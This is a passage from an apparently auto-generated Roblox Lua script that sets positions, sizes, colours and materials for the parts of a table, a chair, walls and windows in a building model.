        Part579.Material = Enum.Material.Wood
        Part579.TopSurface = Enum.SurfaceType.Smooth
        Part579.brickColor = BrickColor.new("Reddish brown")
        Part580.Parent = Model567
        Part580.CFrame = CFrame.new(-9.60000801, 11855.4502, -10.5999889, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part580.Orientation = Vector3.new(0, 90, 0)
        Part580.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -10.59998893737793)
        Part580.Rotation = Vector3.new(0, 90, 0)
        Part580.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part580.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part580.Anchored = true
        Part580.BottomSurface = Enum.SurfaceType.Smooth
        Part580.BrickColor = BrickColor.new("Reddish brown")
        Part580.Material = Enum.Material.Wood
        Part580.TopSurface = Enum.SurfaceType.Smooth
        Part580.brickColor = BrickColor.new("Reddish brown")
        Part581.Parent = Model567
        Part581.CFrame = CFrame.new(-8.50000381, 11854.6504, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part581.Orientation = Vector3.new(0, 90, 0)
        Part581.Position = Vector3.new(-8.500003814697266, 11854.650390625, -11.699995040893555)
        Part581.Rotation = Vector3.new(0, 90, 0)
        Part581.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part581.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part581.Anchored = true
        Part581.BottomSurface = Enum.SurfaceType.Smooth
        Part581.BrickColor = BrickColor.new("Reddish brown")
        Part581.Material = Enum.Material.Wood
        Part581.TopSurface = Enum.SurfaceType.Smooth
        Part581.brickColor = BrickColor.new("Reddish brown")
        Model582.Name = "Table"
        Model582.Parent = Model566
        Part583.Parent = Model582
        Part583.CFrame = CFrame.new(-10.699995, 11855.1504, -8.89999199, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part583.Orientation = Vector3.new(0, 90, 0)
        Part583.Position = Vector3.new(-10.699995040893555, 11855.150390625, -8.899991989135742)
        Part583.Rotation = Vector3.new(0, 90, 0)
        Part583.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part583.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part583.Anchored = true
        Part583.BottomSurface = Enum.SurfaceType.Smooth
        Part583.BrickColor = BrickColor.new("Reddish brown")
        Part583.Material = Enum.Material.Wood
        Part583.TopSurface = Enum.SurfaceType.Smooth
        Part583.brickColor = BrickColor.new("Reddish brown")
        Part584.Parent = Model582
        Part584.CFrame = CFrame.new(-10.699995, 11855.1504, -5.89999151, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part584.Orientation = Vector3.new(0, 90, 0)
        Part584.Position = Vector3.new(-10.699995040893555, 11855.150390625, -5.899991512298584)
        Part584.Rotation = Vector3.new(0, 90, 0)
        Part584.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part584.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part584.Anchored = true
        Part584.BottomSurface = Enum.SurfaceType.Smooth
        Part584.BrickColor = BrickColor.new("Reddish brown")
        Part584.Material = Enum.Material.Wood
        Part584.TopSurface = Enum.SurfaceType.Smooth
        Part584.brickColor = BrickColor.new("Reddish brown")
        Part585.Parent = Model582
        Part585.CFrame = CFrame.new(-8.50000381, 11855.1504, -8.89999199, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part585.Orientation = Vector3.new(0, 90, 0)
        Part585.Position = Vector3.new(-8.500003814697266, 11855.150390625, -8.899991989135742)
        Part585.Rotation = Vector3.new(0, 90, 0)
        Part585.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part585.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part585.Anchored = true
        Part585.BottomSurface = Enum.SurfaceType.Smooth
        Part585.BrickColor = BrickColor.new("Reddish brown")
        Part585.Material = Enum.Material.Wood
        Part585.TopSurface = Enum.SurfaceType.Smooth
        Part585.brickColor = BrickColor.new("Reddish brown")
        Part586.Parent = Model582
        Part586.CFrame = CFrame.new(-8.50000381, 11855.1504, -5.89999151, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part586.Orientation = Vector3.new(0, 90, 0)
        Part586.Position = Vector3.new(-8.500003814697266, 11855.150390625, -5.899991512298584)
        Part586.Rotation = Vector3.new(0, 90, 0)
        Part586.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part586.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part586.Anchored = true
        Part586.BottomSurface = Enum.SurfaceType.Smooth
        Part586.BrickColor = BrickColor.new("Reddish brown")
        Part586.Material = Enum.Material.Wood
        Part586.TopSurface = Enum.SurfaceType.Smooth
        Part586.brickColor = BrickColor.new("Reddish brown")
        Part587.Parent = Model582
        Part587.CFrame = CFrame.new(-9.60000801, 11856.6504, -7.39999151, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part587.Orientation = Vector3.new(0, 90, 0)
        Part587.Position = Vector3.new(-9.600008010864258, 11856.650390625, -7.399991512298584)
        Part587.Rotation = Vector3.new(0, 90, 0)
        Part587.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part587.Size = Vector3.new(3.200000047683716, 0.5999999046325684, 2.4000000953674316)
        Part587.Anchored = true
        Part587.BottomSurface = Enum.SurfaceType.Smooth
        Part587.BrickColor = BrickColor.new("Reddish brown")
        Part587.Material = Enum.Material.Wood
        Part587.TopSurface = Enum.SurfaceType.Smooth
        Part587.brickColor = BrickColor.new("Reddish brown")
        Model588.Name = "Chair"
        Model588.Parent = Model566
        Part589.Parent = Model588
        Part589.CFrame = CFrame.new(-8.50000381, 11854.6504, -5.30000067, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part589.Orientation = Vector3.new(0, -90, 0)
        Part589.Position = Vector3.new(-8.500003814697266, 11854.650390625, -5.3000006675720215)
        Part589.Rotation = Vector3.new(0, -90, 0)
        Part589.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part589.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part589.Anchored = true
        Part589.BottomSurface = Enum.SurfaceType.Smooth
        Part589.BrickColor = BrickColor.new("Reddish brown")
        Part589.Material = Enum.Material.Wood
        Part589.TopSurface = Enum.SurfaceType.Smooth
        Part589.brickColor = BrickColor.new("Reddish brown")
        Seat590.Parent = Model588
        Seat590.CFrame = CFrame.new(-9.60000801, 11855.4502, -4.19999456, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Seat590.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -4.1999945640563965)
        Seat590.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat590.Transparency = 1
        Seat590.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat590.Anchored = true
        Seat590.BottomSurface = Enum.SurfaceType.Smooth
        Seat590.BrickColor = BrickColor.new("Reddish brown")
        Seat590.Material = Enum.Material.Wood
        Seat590.TopSurface = Enum.SurfaceType.Smooth
        Seat590.brickColor = BrickColor.new("Reddish brown")
        Part591.Parent = Model588
        Part591.CFrame = CFrame.new(-9.60000801, 11855.8506, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part591.Orientation = Vector3.new(0, -90, 0)
        Part591.Position = Vector3.new(-9.600008010864258, 11855.8505859375, -3.0999884605407715)
        Part591.Rotation = Vector3.new(0, -90, 0)
        Part591.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part591.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part591.Anchored = true
        Part591.BottomSurface = Enum.SurfaceType.Smooth
        Part591.BrickColor = BrickColor.new("Reddish brown")
        Part591.Material = Enum.Material.Wood
        Part591.TopSurface = Enum.SurfaceType.Smooth
        Part591.brickColor = BrickColor.new("Reddish brown")
        Part592.Parent = Model588
        Part592.CFrame = CFrame.new(-9.60000801, 11857.0498, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part592.Orientation = Vector3.new(0, -90, 0)
        Part592.Position = Vector3.new(-9.600008010864258, 11857.0498046875, -3.0999884605407715)
        Part592.Rotation = Vector3.new(0, -90, 0)
        Part592.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part592.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part592.Anchored = true
        Part592.BottomSurface = Enum.SurfaceType.Smooth
        Part592.BrickColor = BrickColor.new("Reddish brown")
        Part592.Material = Enum.Material.Wood
        Part592.TopSurface = Enum.SurfaceType.Smooth
        Part592.brickColor = BrickColor.new("Reddish brown")
        Part593.Parent = Model588
        Part593.CFrame = CFrame.new(-9.60000801, 11856.6504, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part593.Orientation = Vector3.new(0, -90, 0)
        Part593.Position = Vector3.new(-9.600008010864258, 11856.650390625, -3.0999884605407715)
        Part593.Rotation = Vector3.new(0, -90, 0)
        Part593.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part593.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part593.Anchored = true
        Part593.BottomSurface = Enum.SurfaceType.Smooth
        Part593.BrickColor = BrickColor.new("Reddish brown")
        Part593.Material = Enum.Material.Wood
        Part593.TopSurface = Enum.SurfaceType.Smooth
        Part593.brickColor = BrickColor.new("Reddish brown")
        Part594.Parent = Model588
        Part594.CFrame = CFrame.new(-9.60000801, 11857.4502, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part594.Orientation = Vector3.new(0, -90, 0)
        Part594.Position = Vector3.new(-9.600008010864258, 11857.4501953125, -3.0999884605407715)
        Part594.Rotation = Vector3.new(0, -90, 0)
        Part594.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part594.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part594.Anchored = true
        Part594.BottomSurface = Enum.SurfaceType.Smooth
        Part594.BrickColor = BrickColor.new("Reddish brown")
        Part594.Material = Enum.Material.Wood
        Part594.TopSurface = Enum.SurfaceType.Smooth
        Part594.brickColor = BrickColor.new("Reddish brown")
        Part595.Parent = Model588
        Part595.CFrame = CFrame.new(-9.60000801, 11857.8506, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part595.Orientation = Vector3.new(0, -90, 0)
        Part595.Position = Vector3.new(-9.600008010864258, 11857.8505859375, -3.0999884605407715)
        Part595.Rotation = Vector3.new(0, -90, 0)
        Part595.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part595.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part595.Anchored = true
        Part595.BottomSurface = Enum.SurfaceType.Smooth
        Part595.BrickColor = BrickColor.new("Reddish brown")
        Part595.Material = Enum.Material.Wood
        Part595.TopSurface = Enum.SurfaceType.Smooth
        Part595.brickColor = BrickColor.new("Reddish brown")
        Part596.Parent = Model588
        Part596.CFrame = CFrame.new(-8.50000381, 11856.751, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part596.Orientation = Vector3.new(0, -90, 0)
        Part596.Position = Vector3.new(-8.500003814697266, 11856.7509765625, -3.0999884605407715)
        Part596.Rotation = Vector3.new(0, -90, 0)
        Part596.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part596.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part596.Anchored = true
        Part596.BottomSurface = Enum.SurfaceType.Smooth
        Part596.BrickColor = BrickColor.new("Reddish brown")
        Part596.Material = Enum.Material.Wood
        Part596.TopSurface = Enum.SurfaceType.Smooth
        Part596.brickColor = BrickColor.new("Reddish brown")
        Part597.Parent = Model588
        Part597.CFrame = CFrame.new(-10.699995, 11856.751, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part597.Orientation = Vector3.new(0, -90, 0)
        Part597.Position = Vector3.new(-10.699995040893555, 11856.7509765625, -3.0999884605407715)
        Part597.Rotation = Vector3.new(0, -90, 0)
        Part597.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part597.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part597.Anchored = true
        Part597.BottomSurface = Enum.SurfaceType.Smooth
        Part597.BrickColor = BrickColor.new("Reddish brown")
        Part597.Material = Enum.Material.Wood
        Part597.TopSurface = Enum.SurfaceType.Smooth
        Part597.brickColor = BrickColor.new("Reddish brown")
        Part598.Parent = Model588
        Part598.CFrame = CFrame.new(-8.50000381, 11854.6504, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part598.Orientation = Vector3.new(0, -90, 0)
        Part598.Position = Vector3.new(-8.500003814697266, 11854.650390625, -3.0999884605407715)
        Part598.Rotation = Vector3.new(0, -90, 0)
        Part598.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part598.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part598.Anchored = true
        Part598.BottomSurface = Enum.SurfaceType.Smooth
        Part598.BrickColor = BrickColor.new("Reddish brown")
        Part598.Material = Enum.Material.Wood
        Part598.TopSurface = Enum.SurfaceType.Smooth
        Part598.brickColor = BrickColor.new("Reddish brown")
        Part599.Parent = Model588
        Part599.CFrame = CFrame.new(-9.60000801, 11856.251, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part599.Orientation = Vector3.new(0, -90, 0)
        Part599.Position = Vector3.new(-9.600008010864258, 11856.2509765625, -3.0999884605407715)
        Part599.Rotation = Vector3.new(0, -90, 0)
        Part599.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part599.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part599.Anchored = true
        Part599.BottomSurface = Enum.SurfaceType.Smooth
        Part599.BrickColor = BrickColor.new("Reddish brown")
        Part599.Material = Enum.Material.Wood
        Part599.TopSurface = Enum.SurfaceType.Smooth
        Part599.brickColor = BrickColor.new("Reddish brown")
        Part600.Parent = Model588
        Part600.CFrame = CFrame.new(-10.699995, 11854.6504, -5.30000067, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part600.Orientation = Vector3.new(0, -90, 0)
        Part600.Position = Vector3.new(-10.699995040893555, 11854.650390625, -5.3000006675720215)
        Part600.Rotation = Vector3.new(0, -90, 0)
        Part600.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part600.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part600.Anchored = true
        Part600.BottomSurface = Enum.SurfaceType.Smooth
        Part600.BrickColor = BrickColor.new("Reddish brown")
        Part600.Material = Enum.Material.Wood
        Part600.TopSurface = Enum.SurfaceType.Smooth
        Part600.brickColor = BrickColor.new("Reddish brown")
        Part601.Parent = Model588
        Part601.CFrame = CFrame.new(-9.60000801, 11855.4502, -4.19999456, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part601.Orientation = Vector3.new(0, -90, 0)
        Part601.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -4.1999945640563965)
        Part601.Rotation = Vector3.new(0, -90, 0)
        Part601.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part601.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part601.Anchored = true
        Part601.BottomSurface = Enum.SurfaceType.Smooth
        Part601.BrickColor = BrickColor.new("Reddish brown")
        Part601.Material = Enum.Material.Wood
        Part601.TopSurface = Enum.SurfaceType.Smooth
        Part601.brickColor = BrickColor.new("Reddish brown")
        Part602.Parent = Model588
        Part602.CFrame = CFrame.new(-10.699995, 11854.6504, -3.09998846, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part602.Orientation = Vector3.new(0, -90, 0)
        Part602.Position = Vector3.new(-10.699995040893555, 11854.650390625, -3.0999884605407715)
        Part602.Rotation = Vector3.new(0, -90, 0)
        Part602.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part602.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part602.Anchored = true
        Part602.BottomSurface = Enum.SurfaceType.Smooth
        Part602.BrickColor = BrickColor.new("Reddish brown")
        Part602.Material = Enum.Material.Wood
        Part602.TopSurface = Enum.SurfaceType.Smooth
        Part602.brickColor = BrickColor.new("Reddish brown")
        Part603.Parent = Model0
        Part603.CFrame = CFrame.new(-6.89999962, 11865.1504, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part603.Position = Vector3.new(-6.899999618530273, 11865.150390625, 22.549999237060547)
        Part603.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part603.Size = Vector3.new(0.19999989867210388, 1, 19.100000381469727)
        Part603.Anchored = true
        Part603.BottomSurface = Enum.SurfaceType.Smooth
        Part603.BrickColor = BrickColor.new("Dark stone grey")
        Part603.Material = Enum.Material.SmoothPlastic
        Part603.TopSurface = Enum.SurfaceType.Smooth
        Part603.brickColor = BrickColor.new("Dark stone grey")
        Part604.Parent = Model0
        Part604.CFrame = CFrame.new(-6.95000267, 11859.2998, 30.6500206, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part604.Orientation = Vector3.new(0, -90, 0)
        Part604.Position = Vector3.new(-6.950002670288086, 11859.2998046875, 30.650020599365234)
        Part604.Rotation = Vector3.new(0, -90, 0)
        Part604.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part604.Size = Vector3.new(2.9000000953674316, 10.699999809265137, 0.10000000149011612)
        Part604.Anchored = true
        Part604.BottomSurface = Enum.SurfaceType.Smooth
        Part604.BrickColor = BrickColor.new("White")
        Part604.Material = Enum.Material.SmoothPlastic
        Part604.TopSurface = Enum.SurfaceType.Smooth
        Part604.brickColor = BrickColor.new("White")
        Part605.Parent = Model0
        Part605.CFrame = CFrame.new(-6.95000648, 11859.6504, 29.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part605.Position = Vector3.new(-6.950006484985352, 11859.650390625, 29.099998474121094)
        Part605.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part605.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part605.Anchored = true
        Part605.BottomSurface = Enum.SurfaceType.Smooth
        Part605.BrickColor = BrickColor.new("Really black")
        Part605.Material = Enum.Material.SmoothPlastic
        Part605.TopSurface = Enum.SurfaceType.Smooth
        Part605.brickColor = BrickColor.new("Really black")
        Part606.Parent = Model0
        Part606.CFrame = CFrame.new(-6.8500042, 11859.2998, 22.4500122, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part606.Position = Vector3.new(-6.850004196166992, 11859.2998046875, 22.45001220703125)
        Part606.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part606.Size = Vector3.new(0.09999847412109375, 10.699999809265137, 18.899999618530273)
        Part606.Anchored = true
        Part606.BottomSurface = Enum.SurfaceType.Smooth
        Part606.BrickColor = BrickColor.new("White")
        Part606.Material = Enum.Material.Wood
        Part606.TopSurface = Enum.SurfaceType.Smooth
        Part606.brickColor = BrickColor.new("White")
        Part607.Parent = Model0
        Part607.CFrame = CFrame.new(3.04999733, 11859.2998, 31.9000206, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part607.Orientation = Vector3.new(0, -90, 0)
        Part607.Position = Vector3.new(3.049997329711914, 11859.2998046875, 31.900020599365234)
        Part607.Rotation = Vector3.new(0, -90, 0)
        Part607.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part607.Size = Vector3.new(0.20000000298023224, 10.699999809265137, 19.899999618530273)
        Part607.Anchored = true
        Part607.BottomSurface = Enum.SurfaceType.Smooth
        Part607.BrickColor = BrickColor.new("White")
        Part607.Material = Enum.Material.Wood
        Part607.TopSurface = Enum.SurfaceType.Smooth
        Part607.brickColor = BrickColor.new("White")
        Part608.Name = "Window"
        Part608.Parent = Model0
        Part608.CFrame = CFrame.new(-6.95000267, 11859.6504, 21.1500015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part608.Position = Vector3.new(-6.950002670288086, 11859.650390625, 21.150001525878906)
        Part608.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part608.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 4.899999618530273)
        Part608.Anchored = true
        Part608.BottomSurface = Enum.SurfaceType.Smooth
        Part608.BrickColor = BrickColor.new("White")
        Part608.Material = Enum.Material.Glass
        Part608.Reflectance = 1
        Part608.TopSurface = Enum.SurfaceType.Smooth
        Part608.brickColor = BrickColor.new("White")
        Part609.Parent = Model0
        Part609.CFrame = CFrame.new(-6.95000267, 11856.2002, 21.1500015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part609.Position = Vector3.new(-6.950002670288086, 11856.2001953125, 21.150001525878906)
        Part609.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part609.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 15.699999809265137)
        Part609.Anchored = true
        Part609.BottomSurface = Enum.SurfaceType.Smooth
        Part609.BrickColor = BrickColor.new("Really black")
        Part609.Material = Enum.Material.SmoothPlastic
        Part609.TopSurface = Enum.SurfaceType.Smooth
        Part609.brickColor = BrickColor.new("Really black")
        Part610.Name = "Window"
        Part610.Parent = Model0
        Part610.CFrame = CFrame.new(-6.95000267, 11859.6504, 26.4000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part610.Position = Vector3.new(-6.950002670288086, 11859.650390625, 26.400001525878906)
        Part610.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part610.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 5.199999809265137)
        Part610.Anchored = true
        Part610.BottomSurface = Enum.SurfaceType.Smooth
        Part610.BrickColor = BrickColor.new("White")
        Part610.Material = Enum.Material.Glass
        Part610.Reflectance = 1
        Part610.TopSurface = Enum.SurfaceType.Smooth
        Part610.brickColor = BrickColor.new("White")
        Part611.Parent = Model0
        Part611.CFrame = CFrame.new(-6.95000648, 11859.6504, 23.6999969, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part611.Position = Vector3.new(-6.950006484985352, 11859.650390625, 23.699996948242188)
        Part611.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part611.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 0.19999998807907104)
        Part611.Anchored = true
        Part611.BottomSurface = Enum.SurfaceType.Smooth
        Part611.BrickColor = BrickColor.new("Really black")
        Part611.Material = Enum.Material.SmoothPlastic
        Part611.TopSurface = Enum.SurfaceType.Smooth
        Part611.brickColor = BrickColor.new("Really black")
        Part612.Parent = Model0
        Part612.CFrame = CFrame.new(-6.95000267, 11855.0498, 21.1500092, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part612.Position = Vector3.new(-6.950002670288086, 11855.0498046875, 21.150009155273438)
        Part612.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part612.Size = Vector3.new(0.09999990463256836, 2.200000047683716, 16.100000381469727)
        Part612.Anchored = true
        Part612.BottomSurface = Enum.SurfaceType.Smooth
        Part612.BrickColor = BrickColor.new("White")
        Part612.Material = Enum.Material.SmoothPlastic
        Part612.TopSurface = Enum.SurfaceType.Smooth
        Part612.brickColor = BrickColor.new("White")
        Part613.Parent = Model0
        Part613.CFrame = CFrame.new(-12.1499996, 11857.7002, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part613.Position = Vector3.new(-12.149999618530273, 11857.7001953125, 13.050023078918457)
        Part613.Color = Color3.new(0.792157, 0.796078, 0.819608)
        Part613.Transparency = 0.4000000059604645
        Part613.Size = Vector3.new(4.300000190734863, 7.5, 0.10000000149011612)
        Part613.Anchored = true
        Part613.BottomSurface = Enum.SurfaceType.Smooth
        Part613.BrickColor = BrickColor.new("Ghost grey")
        Part613.CanCollide = false
        Part613.Material = Enum.Material.Glass
        Part613.TopSurface = Enum.SurfaceType.Smooth
        Part613.brickColor = BrickColor.new("Ghost grey")
        Part614.Parent = Model0
        Part614.CFrame = CFrame.new(-14.3499966, 11857.7002, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part614.Position = Vector3.new(-14.349996566772461, 11857.7001953125, 13.050023078918457)
        Part614.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part614.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part614.Anchored = true
        Part614.BottomSurface = Enum.SurfaceType.Smooth
        Part614.BrickColor = BrickColor.new("Really black")
        Part614.Material = Enum.Material.SmoothPlastic
        Part614.TopSurface = Enum.SurfaceType.Smooth
        Part614.brickColor = BrickColor.new("Really black")
        Part615.Parent = Model0
        Part615.CFrame = CFrame.new(-17.5500011, 11857.5498, 11.700017, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part615.Position = Vector3.new(-17.55000114440918, 11857.5498046875, 11.700016975402832)
        Part615.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part615.Size = Vector3.new(0.2999998927116394, 0.19999995827674866, 3.1999998092651367)
        Part615.Anchored = true
        Part615.BottomSurface = Enum.SurfaceType.Smooth
        Part615.BrickColor = BrickColor.new("Lily white")
        Part615.Material = Enum.Material.Wood
        Part615.TopSurface = Enum.SurfaceType.Smooth
        Part615.brickColor = BrickColor.new("Lily white")
        Part616.Parent = Model0
        Part616.CFrame = CFrame.new(-17.3500042, 11861.2998, 11.6000071, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part616.Orientation = Vector3.new(0, 90, 0)
        Part616.Position = Vector3.new(-17.350004196166992, 11861.2998046875, 11.600007057189941)
        Part616.Rotation = Vector3.new(0, 90, 0)
        Part616.Color = Color3.new(1, 0, 0)
        Part616.Size = Vector3.new(3, 7.699999809265137, 0.10000000149011612)
        Part616.Anchored = true
        Part616.BottomSurface = Enum.SurfaceType.Smooth
        Part616.BrickColor = BrickColor.new("Really red")
        Part616.Material = Enum.Material.SmoothPlastic
        Part616.TopSurface = Enum.SurfaceType.Smooth
        Part616.brickColor = BrickColor.new("Really red")
        Part617.Parent = Model0
        Part617.CFrame = CFrame.new(-17.3500042, 11859.0498, 10.0000086, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part617.Position = Vector3.new(-17.350004196166992, 11859.0498046875, 10.000008583068848)
        Part617.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part617.Size = Vector3.new(0.09999990463256836, 8.199999809265137, 0.19999998807907104)
        Part617.Anchored = true
        Part617.BottomSurface = Enum.SurfaceType.Smooth
        Part617.BrickColor = BrickColor.new("Really black")
        Part617.Material = Enum.Material.SmoothPlastic
        Part617.TopSurface = Enum.SurfaceType.Smooth
        Part617.brickColor = BrickColor.new("Really black")
        Part618.Parent = Model0
        Part618.CFrame = CFrame.new(-17.3500042, 11855.001, 5.60001087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part618.Position = Vector3.new(-17.350004196166992, 11855.0009765625, 5.600010871887207)
        Part618.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part618.Size = Vector3.new(0.09999990463256836, 0.09999942779541016, 8.600000381469727)
        Part618.Anchored = true
        Part618.BottomSurface = Enum.SurfaceType.Smooth
        Part618.BrickColor = BrickColor.new("Really black")
        Part618.Material = Enum.Material.SmoothPlastic
        Part618.TopSurface = Enum.SurfaceType.Smooth
        Part618.brickColor = BrickColor.new("Really black")
        Part619.Parent = Model0
        Part619.CFrame = CFrame.new(-17.3500042, 11854.4502, 5.60001087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part619.Position = Vector3.new(-17.350004196166992, 11854.4501953125, 5.600010871887207)
        Part619.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part619.Size = Vector3.new(0.09999990463256836, 0.9999996423721313, 9)
        Part619.Anchored = true
        Part619.BottomSurface = Enum.SurfaceType.Smooth
        Part619.BrickColor = BrickColor.new("Mid gray")
        Part619.Material = Enum.Material.Cobblestone
        Part619.TopSurface = Enum.SurfaceType.Smooth
        Part619.brickColor = BrickColor.new("Mid gray")
        Part620.Parent = Model0
        Part620.CFrame = CFrame.new(-15.8999996, 11857.5498, 13.2000132, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part620.Position = Vector3.new(-15.899999618530273, 11857.5498046875, 13.200013160705566)
        Part620.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part620.Size = Vector3.new(3, 0.19999995827674866, 0.19999924302101135)
        Part620.Anchored = true
        Part620.BottomSurface = Enum.SurfaceType.Smooth
        Part620.BrickColor = BrickColor.new("Lily white")
        Part620.Material = Enum.Material.Wood
        Part620.TopSurface = Enum.SurfaceType.Smooth
        Part620.brickColor = BrickColor.new("Lily white")
        Part621.Parent = Model0
        Part621.CFrame = CFrame.new(-5.65000343, 11859.2998, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part621.Position = Vector3.new(-5.650003433227539, 11859.2998046875, 13.05001163482666)
        Part621.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part621.Size = Vector3.new(2.2999978065490723, 10.69999885559082, 0.10000000149011612)
        Part621.Anchored = true
        Part621.BottomSurface = Enum.SurfaceType.Smooth
        Part621.BrickColor = BrickColor.new("White")
        Part621.Material = Enum.Material.Wood
        Part621.TopSurface = Enum.SurfaceType.Smooth
        Part621.brickColor = BrickColor.new("White")
        Part622.Parent = Model0
        Part622.CFrame = CFrame.new(-4.44999886, 11857.7002, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part622.Position = Vector3.new(-4.44999885559082, 11857.7001953125, 13.050023078918457)
        Part622.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part622.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part622.Anchored = true
        Part622.BottomSurface = Enum.SurfaceType.Smooth
